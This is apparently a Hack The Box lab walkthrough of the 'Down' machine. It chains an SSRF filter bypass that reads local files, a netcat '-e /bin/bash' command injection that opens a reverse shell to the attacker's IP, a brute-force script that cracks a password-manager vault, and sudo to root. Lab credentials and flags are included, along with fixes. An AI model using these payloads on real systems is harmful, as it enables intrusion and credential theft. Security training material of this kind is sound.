# Down - HTB Walkthrough

## Machine Information
- **Name:** Down
- **IP:** 10.129.70.122
- **Difficulty:** Easy/Medium
- **OS:** Linux (Ubuntu 22.04)
- **Attacker IP:** 10.10.15.35

---

## Table of Contents
1. [Initial Enumeration](#initial-enumeration)
2. [Web Application Discovery](#web-application-discovery)
3. [Understanding SSRF Vulnerability](#understanding-ssrf-vulnerability)
4. [Exploiting SSRF for File Read](#exploiting-ssrf-for-file-read)
5. [Command Injection Discovery](#command-injection-discovery)
6. [Initial Access](#initial-access)
7. [Lateral Movement](#lateral-movement)
8. [Privilege Escalation](#privilege-escalation)
9. [Attack Chain Summary](#attack-chain-summary)

---

## Initial Enumeration

### Step 1: Port Scanning with Nmap

**Why?** The first step in any penetration test is discovering what services are running on the target. Nmap (Network Mapper) is the industry-standard tool for port scanning and service detection. This helps us understand the attack surface.

**Command:**
```bash
nmap -p- --min-rate=10000 -T5 -sCV -Pn -oN nmap_scan.txt 10.129.70.122
```

**Flags Explained:**
- `-p-`: Scan ALL 65,535 TCP ports (not just the common 1000)
- `--min-rate=10000`: Send at least 10,000 packets per second for faster scanning
- `-T5`: Timing template 5 (most aggressive/fastest)
- `-sCV`: Combines `-sC` (default scripts) and `-sV` (version detection)
- `-Pn`: Skip host discovery (HTB machines don't respond to ping)
- `-oN nmap_scan.txt`: Save output to file

**Output:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Is it down or just me?
|_http-server-header: Apache/2.4.52 (Ubuntu)
```

**Analysis:**

**Port 22 (SSH):**
- OpenSSH 8.9p1 - Recent version, unlikely to have exploitable vulnerabilities
- Requires credentials (we'll need to find them)

**Port 80 (HTTP):**
- Apache 2.4.52 web server
- **Title: "Is it down or just me?"** - This suggests the website checks if other sites are accessible
- This functionality often leads to **SSRF (Server-Side Request Forgery)** vulnerabilities

**Next Step:** Enumerate the web application.

---

### Step 2: Directory Enumeration

**Why?** Web applications often have hidden directories, admin panels, or backup files not linked from the main page.

**Command:**
```bash
dirsearch -u http://10.129.70.122
```

**Key Findings:**
- `/javascript/` (301 redirect) - Standard directory
- `/server-status` (403 Forbidden) - Apache status page, properly protected
- No admin panels or obvious entry points discovered

**Conclusion:** The main application functionality is our focus.

---

## Web Application Discovery

### Step 3: Manual Website Exploration

**Command:**
```bash
curl -s http://10.129.70.122
```

**HTML Form Found:**
```html
<form id="urlForm" action="index.php" method="POST">
    <input type="url" id="url" name="url" placeholder="Please enter a URL." required>
    <button type="submit">Is it down?</button>
</form>
```

**Observations:**
- Takes a URL as input via POST parameter `url`
- Server checks if that URL is accessible
- Returns results to the user
- **Classic SSRF scenario**: Server makes HTTP requests based on user input

---

## Understanding SSRF Vulnerability

### Step 4: Testing with Controlled Servers

**What is SSRF?**
Server-Side Request Forgery is a vulnerability where an attacker can make the server send HTTP requests to arbitrary destinations. This is dangerous because:
- The server can access internal resources we can't reach
- Can bypass firewalls
- Can read local files
- Can access cloud metadata endpoints

**Setting Up Test Environment:**

**Terminal 1 - Python HTTP Server:**
```bash
python3 -m http.server 8080
```
- Logs incoming requests
- Returns valid HTTP responses

**Terminal 2 - Netcat Listener:**
```bash
nc -lvnp 9001
```
- Shows raw HTTP headers
- Captures complete request data

**Testing the Application:**
```bash
curl -X POST http://10.129.70.122/index.php -d "url=http://10.10.15.35:8080"
```

**Python Server Output:**
```
10.129.70.122 - - [12/Jan/2026 05:45:15] "GET / HTTP/1.1" 200 -
```

**Success!** The target server connected to us, confirming SSRF.

**Netcat Captured:**
```
GET / HTTP/1.1
Host: 10.10.15.35:9001
User-Agent: curl/7.81.0
Accept: */*
```

**Critical Discovery:**
- Backend uses `curl 7.81.0`
- Server makes requests based on our input
- We can see the response in the web output

---

### The Complete SSRF Flow Diagram

```
YOU (Attacker)              TARGET SERVER            YOUR LISTENER
10.10.15.35                 10.129.70.122            10.10.15.35
     │                            │                        │
     │ 1. POST request            │                        │
     │    url=http://10.10.15.35  │                        │
     │ ─────────────────────────> │                        │
     │                            │                        │
     │                            │ 2. Backend executes:   │
     │                            │    curl http://...     │
     │                            │                        │
     │                            │ 3. GET / HTTP/1.1      │
     │                            │ ─────────────────────> │
     │                            │    User-Agent: curl    │
     │                            │                        │
     │                            │ 4. HTTP Response       │
     │                            │ <───────────────────── │
     │                            │                        │
     │ 5. Shows response content  │                        │
     │ <───────────────────────── │                        │
     │                            │                        │
```

**Key Points:**
1. YOU send a POST request with a URL to check
2. TARGET receives it and executes curl on that URL
3. TARGET connects to YOUR server (not you connecting to target!)
4. YOUR server responds with content
5. TARGET displays that content back to you

**Why This Matters:**
- We control WHERE the server makes requests
- The server can access internal resources (127.0.0.1, 192.168.x.x)
- We can potentially read local files with `file://` protocol

---

## Exploiting SSRF for File Read

### Step 5: Testing Protocol Restrictions

**Attempt 1 - Direct File Protocol:**
```bash
curl -X POST http://10.129.70.122/index.php -d "url=file:///etc/passwd"
```

**Response:**
```
Only protocols http or https allowed.
```

**Analysis:**
- Application has input validation
- Regex filter: `^https?://` (string must START with http:// or https://)
- We need a bypass technique

---

### Step 6: Protocol Filter Bypass

**The Bypass - Multiple URLs:**

**Why This Works:**
Curl can process multiple space-separated URLs in a single command:
```bash
curl http://example.com file:///etc/passwd
```

Curl will request BOTH URLs and output both results.

**Exploit Command:**
```bash
curl -X POST http://10.129.70.122/index.php -d "url=http://127.0.0.1 file:///etc/passwd"
```

**What Happens:**
1. PHP checks: `preg_match('|^https?://|', "http://127.0.0.1 file:///etc/passwd")` → **PASSES** (starts with http://)
2. Executes: `curl -s http://127.0.0.1 file:///etc/passwd`
3. Curl processes both URLs
4. Returns content from both

**Result:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
aleks:x:1000:1000:Aleks:/home/aleks:/bin/bash
...
```

**Success! We can read local files!**

**Key Users Identified:**
- **root** (UID 0) - System administrator
- **aleks** (UID 1000) - Regular user account with /bin/bash shell
- **www-data** (UID 33) - Web server user

---

## Command Injection Discovery

### Step 7: Reading PHP Source Code

**Command:**
```bash
curl -X POST http://10.129.70.122/index.php -d "url=http://127.0.0.1 file:///var/www/html/index.php"
```

**Source Code Analysis Reveals Two Modes:**

**Mode 1: Normal Mode (What we've been using)**
```php
if (isset($_POST['url'])) {
    $url = trim($_POST['url']);
    if ( preg_match('|^https?://|',$url) ) {
        $ec = escapeshellcmd("/usr/bin/curl -s $url");
        exec($ec . " 2>&1",$output,$rc);
        // Display output
    }
}
```

**Mode 2: Expert Mode (Hidden Feature!)**

Accessed via: `http://10.129.70.122/index.php?expertmode=tcp`

```php
if ( isset($_GET['expertmode']) && $_GET['expertmode'] === 'tcp' ) {
    // Shows port checking interface
    echo '<form action="index.php?expertmode=tcp" method="POST">
              <input type="text" name="ip">
              <input type="number" name="port">
          </form>';
}

if ( isset($_GET['expertmode']) && $_GET['expertmode'] === 'tcp' && 
     isset($_POST['ip']) && isset($_POST['port']) ) {
    $ip = trim($_POST['ip']);
    $valid_ip = filter_var($ip, FILTER_VALIDATE_IP);
    $port = trim($_POST['port']);
    $port_int = intval($port);
    $valid_port = filter_var($port_int, FILTER_VALIDATE_INT);
    
    if ( $valid_ip && $valid_port ) {
        $ec = escapeshellcmd("/usr/bin/nc -vz $ip $port");
        exec($ec . " 2>&1",$output,$rc);
    }
}
```

**The Vulnerability - Validation Mismatch:**

```php
$port = trim($_POST['port']);           // Original string: "1337 -e /bin/bash 10.10.15.35 9001"
$port_int = intval($port);              // Converts to: 1337 (stops at first non-digit)
$valid_port = filter_var($port_int, FILTER_VALIDATE_INT);  // Validates 1337 ✓

// BUT USES ORIGINAL $port HERE:
$ec = escapeshellcmd("/usr/bin/nc -vz $ip $port");  // Uses full string!
```

**Why This Works:**
- `intval("1337 -e /bin/bash")` returns `1337`
- Validation passes (1337 is valid integer)
- BUT command uses original `$port` string with our injection!
- `escapeshellcmd()` doesn't prevent additional arguments to the same command

**Netcat's `-e` Flag:**
```
-e program    Execute program after connection
```

**Our Payload:**
```
ip=10.10.15.35
port=1337 -e /bin/bash 10.10.15.35 1337
```

**Resulting Command:**
```bash
/usr/bin/nc -vz 10.10.15.35 1337 -e /bin/bash 10.10.15.35 1337
```

This creates a reverse shell!

---

## Initial Access

### Step 8: Exploiting Command Injection

**Terminal 1 - Setup Listener:**
```bash
nc -lvnp 1337
```

**Terminal 2 - Send Exploit:**
```bash
curl -X POST "http://10.129.70.122/index.php?expertmode=tcp" \
  -d "ip=10.10.15.35" \
  -d "port=1337 -e /bin/bash 10.10.15.35 1337"
```

**Terminal 1 Output:**
```
listening on [any] 1337 ...
connect to [10.10.15.35] from (UNKNOWN) [10.129.70.122] 54321
```

**We have a shell as www-data!**

**Shell Stabilization:**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
# Press Enter twice
export TERM=xterm
export SHELL=/bin/bash
```

**Getting User Flag:**
```bash
find / -name "user*.txt" 2>/dev/null
cat /var/www/html/user_aeT1xa.txt
```

**User Flag:** `d4bc94b386ef7c8113698a8c4951cacd` ✅

---

## Lateral Movement

### Step 9: Discovering Password Manager

**Enumeration:**
```bash
ls -la /home/aleks/.local/share/
```

**Found:** `/home/aleks/.local/share/pswm/pswm`

**Content:**
```bash
cat /home/aleks/.local/share/pswm/pswm
```

**Output:**
```
e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==
```

**Analysis:**
- Base64-encoded data separated by asterisks
- Format: `encrypted_data*salt*IV*tag`
- Research reveals: **pswm** is a Python-based CLI password manager
- Uses AES encryption with master password

---

### Step 10: Brute Forcing Master Password

**On Attacking Machine:**

**Transfer encrypted file:**
```bash
# Save the encrypted content
cat > pswm_encrypted << 'EOF'
e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==
EOF
```

**Clone pswm repository:**
```bash
git clone https://github.com/RoiArthurB/pswm.git
cd pswm/
```

**Create brute force script:**
```python
#!/usr/bin/env python3
import base64
import sys
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

def decrypt_pswm(encrypted_data, master_password):
    try:
        parts = encrypted_data.strip().split('*')
        if len(parts) != 4:
            return None
        
        ciphertext = base64.b64decode(parts[0])
        salt = base64.b64decode(parts[1])
        nonce = base64.b64decode(parts[2])
        tag = base64.b64decode(parts[3])
        
        key = PBKDF2(master_password, salt, dkLen=32)
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        
        return plaintext.decode('utf-8')
    except:
        return None

with open('pswm_encrypted', 'r') as f:
    encrypted = f.read().strip()

print("[*] Starting brute force attack...")
with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as f:
    for i, password in enumerate(f, 1):
        password = password.strip()
        
        if i % 1000 == 0:
            print(f"[*] Tried {i} passwords...", end='\r')
        
        result = decrypt_pswm(encrypted, password)
        if result:
            print(f"\n[+] SUCCESS! Master password: {password}")
            print(f"[+] Decrypted content:\n{result}")
            sys.exit(0)
```

**Run the attack:**
```bash
python3 brute_pswm.py
```

**Output:**
```
[+] SUCCESS! Master password: 1uY3w22uc-Wr{xNHR~+E
[+] Decrypted content:
ssh:aleks:1uY3w22uc-Wr{xNHR~+E
```

**Credentials Found:**
- Username: `aleks`
- Password: `1uY3w22uc-Wr{xNHR~+E`

**SSH Access:**
```bash
ssh aleks@10.129.70.122
Password: 1uY3w22uc-Wr{xNHR~+E
```

**Success! We're now aleks!**

---

## Privilege Escalation

### Step 11: Sudo Enumeration

**Check sudo privileges:**
```bash
sudo -l
```

**Output:**
```
User aleks may run the following commands on down:
    (ALL : ALL) ALL
```

**Analysis:**
- `(ALL : ALL) ALL` means aleks can run ANY command as ANY user (including root)
- No restrictions whatsoever
- This is a complete sudo misconfiguration

**Becoming Root:**
```bash
sudo su
```

**Or:**
```bash
sudo /bin/bash
```

**Verification:**
```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)
```

**Getting Root Flag:**
```bash
cat /root/root.txt
```

**Root Flag:** `87bb9869a311b8abb5fb4d3c7248fdcb` ✅

**Machine Pwned!** 🎉

---

## Attack Chain Summary

```
┌─────────────────────────────────────────────────────────────────┐
│                       ATTACK CHAIN                               │
└─────────────────────────────────────────────────────────────────┘

1. RECONNAISSANCE
   ↓
   nmap scan → Ports 22 (SSH), 80 (HTTP)
   ↓
   Website: "Is it down or just me?"
   ↓

2. SSRF DISCOVERY
   ↓
   Test with controlled server → Confirmed SSRF
   ↓
   Captured: User-Agent: curl/7.81.0
   ↓
   Test file:// protocol → Blocked
   ↓

3. SSRF EXPLOITATION
   ↓
   Bypass filter: curl http://127.0.0.1 file:///etc/passwd
   ↓
   Read /etc/passwd → Found user: aleks
   ↓
   Read /var/www/html/index.php → Discovered expert mode
   ↓

4. COMMAND INJECTION
   ↓
   Expert mode: ?expertmode=tcp
   ↓
   Validation bug: validates $port_int, uses $port
   ↓
   Payload: port=1337 -e /bin/bash 10.10.15.35 1337
   ↓
   Reverse shell as www-data
   ↓
   User flag: d4bc94b386ef7c8113698a8c4951cacd
   ↓

5. LATERAL MOVEMENT
   ↓
   Found: /home/aleks/.local/share/pswm
   ↓
   Research: pswm = password manager
   ↓
   Brute force master password
   ↓
   Found: 1uY3w22uc-Wr{xNHR~+E
   ↓
   SSH as aleks
   ↓

6. PRIVILEGE ESCALATION
   ↓
   sudo -l → (ALL : ALL) ALL
   ↓
   sudo su → Root access
   ↓
   Root flag: 87bb9869a311b8abb5fb4d3c7248fdcb
   ↓
   Machine pwned! 🎉
```

---

## Key Takeaways

### Vulnerabilities Exploited:

**1. Server-Side Request Forgery (SSRF)**
- **What:** Server makes HTTP requests based on user input
- **Impact:** Access internal resources, read local files
- **Detection:** URL input + backend HTTP functionality
- **Bypass:** Multiple URL technique for curl

**2. Protocol Filter Bypass**
- **Vulnerability:** Regex only checks START of string (`^https?://`)
- **Exploit:** `curl http://valid file:///malicious`
- **Why it works:** Curl processes multiple space-separated URLs
- **Fix:** Strict URL parsing, validate entire input

**3. Command Injection via Validation Mismatch**
- **Bug:** Validates `intval($port)` but uses original `$port`
- **Exploit:** `port=1337 -e /bin/bash`
- **Why it works:** `intval()` stops at first non-digit, but full string used in command
- **Fix:** Use the validated variable in execution

**4. escapeshellcmd() Limitations**
- **What it does:** Escapes shell metacharacters (`;`, `|`, `&`)
- **What it doesn't:** Prevent additional arguments
- **Example:** `nc -vz IP PORT -e /bin/bash` has no metacharacters
- **Fix:** Use `escapeshellarg()` for each argument

**5. Weak Password Manager Master Password**
- **Issue:** Master password in rockyou.txt wordlist
- **Impact:** Complete password database compromise
- **Attack:** Offline brute force (no rate limiting)
- **Fix:** Strong passphrases, key derivation with high iterations

**6. Sudo Misconfiguration**
- **Config:** `(ALL : ALL) ALL` - Full sudo access
- **Impact:** Direct root access
- **Fix:** Principle of least privilege, specific command restrictions

---

### Tools Used:
- **nmap** - Port scanning
- **dirsearch** - Directory enumeration
- **curl** - HTTP requests and exploitation
- **netcat** - Reverse shell listener
- **Python http.server** - SSRF testing
- **Python script** - Password brute forcing
- **ssh** - Lateral movement

### Credentials:
```
SSRF Bypass:
- Multiple URL technique for file read

Command Injection:
- Expert mode port parameter

Password Manager:
- Master password: 1uY3w22uc-Wr{xNHR~+E

SSH:
- aleks:1uY3w22uc-Wr{xNHR~+E

Sudo:
- Full access: (ALL : ALL) ALL

Flags:
- User: d4bc94b386ef7c8113698a8c4951cacd
- Root: 87bb9869a311b8abb5fb4d3c7248fdcb
```

---

## Files and Artifacts

### Directory Structure:
```
13_Down/
├── README.md           # This walkthrough
├── WALKTHROUGH.md      # Copy of walkthrough
├── outputs/
│   ├── nmap_scan.txt   # Port scan results
│   ├── ssrf.txt        # SSRF test output
│   └── php.txt         # PHP source code
└── scripts/
    └── brute_pswm.py   # Password brute force script
```

---

**Machine Completed:** January 12, 2026  
**Difficulty Rating:** Easy/Medium  
**Time to Pwn:** ~3 hours  
**Most Interesting Part:** The SSRF protocol filter bypass using curl's multiple URL feature - elegant and educational!

---

## Learning Resources

**SSRF:**
- OWASP SSRF Testing Guide
- PortSwigger Web Security Academy - SSRF
- HackTricks - SSRF Guide

**Command Injection:**
- OWASP Command Injection
- PayloadsAllTheThings

**Password Cracking:**
- Hashcat Tutorial
- John the Ripper Documentation

**Linux Privilege Escalation:**
- GTFOBins
- LinPEAS
- HackTricks Linux PrivEsc
